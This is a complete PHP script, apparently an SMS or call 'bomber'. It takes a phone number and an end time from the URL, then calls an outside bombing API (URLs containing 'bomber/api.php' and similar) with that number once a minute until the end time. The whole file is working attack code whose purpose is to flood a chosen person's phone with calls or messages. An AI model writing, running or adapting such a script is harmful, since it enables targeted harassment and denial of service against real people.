<?php
// API URL
$api_url = 'https://api.task10.top/call.php?number=';
$api_url = 'https://alvi0.xyz/bomber/api.php?num=';
$api_url = 'https://alvi0.xyz/bsms/sikho.php?phone=';
$api_url = 'https://ultranetrn.com.br/fonts/api.php?number=';
// Time parameter from GET request
$time_param = isset($_GET['time']) ? $_GET['time'] : null;
$phone_number = isset($_GET['num']) ? $_GET['num'] : null;

if (!$time_param || !$phone_number) {
    die('Error: Missing parameters.');
}

// Convert time parameter to timestamp
$target_time = strtotime($time_param);
$current_time = time();

// Calculate the delay in seconds
$delay = $target_time - $current_time;

if ($delay <= 0) {
    die('Error: Target time must be in the future.');
}

// Function to send request
function send_request($api_url, $phone_number) {
    $url = $api_url . $phone_number;
    file_get_contents($url); // Send the API request
}

// Send requests every minute until the target time
while (time() < $target_time) {
    send_request($api_url, $phone_number);
    sleep(60); // Wait for 1 minute
}

echo 'Requests sent successfully.';
?>